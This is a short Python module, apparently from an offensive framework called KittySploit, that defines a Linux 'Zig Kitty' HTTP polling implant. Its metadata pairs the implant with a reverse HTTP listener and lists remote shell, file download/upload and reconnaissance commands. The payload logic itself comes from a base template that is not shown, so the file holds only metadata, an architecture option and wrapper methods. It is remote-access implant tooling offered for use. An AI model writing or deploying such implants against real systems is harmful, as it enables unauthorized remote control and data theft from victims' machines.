#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zig Kitty HTTP polling implant (Linux)."""

from kittysploit import *
from core.payload_templates.zig_kitty_http_polling import ZigKittyHttpPollingBase


class Module(ZigKittyHttpPollingBase, Payload):
    __info__ = {
        "name": "Zig Kitty Agent HTTP Polling (Linux)",
        "description": (
            "Compiled Zig Kitty implant: typed tasks over HTTP polling "
            "(shell/ls/pwd/whoami/cat/download/upload/exit). "
            "Pairs with listeners/multi/reverse_http_polling."
        ),
        "author": ["KittySploit Team"],
        "version": "1.0.0",
        "category": "singles",
        "platform": Platform.UNIX,
        "arch": [Arch.X64, Arch.X86, Arch.ARM64],
        "listener": "listeners/multi/reverse_http_polling",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
        "references": ["https://ziglang.org/"],
    }

    target_arch = OptChoice(
        "x86_64",
        "Target architecture",
        True,
        choices=["x86_64", "x86", "aarch64"],
    )

    def _target_os(self) -> str:
        return "linux"

    def _binary_name(self) -> str:
        return "kitty_agent"

    def generate(self):
        return super().generate()

    def run(self):
        return self.generate()
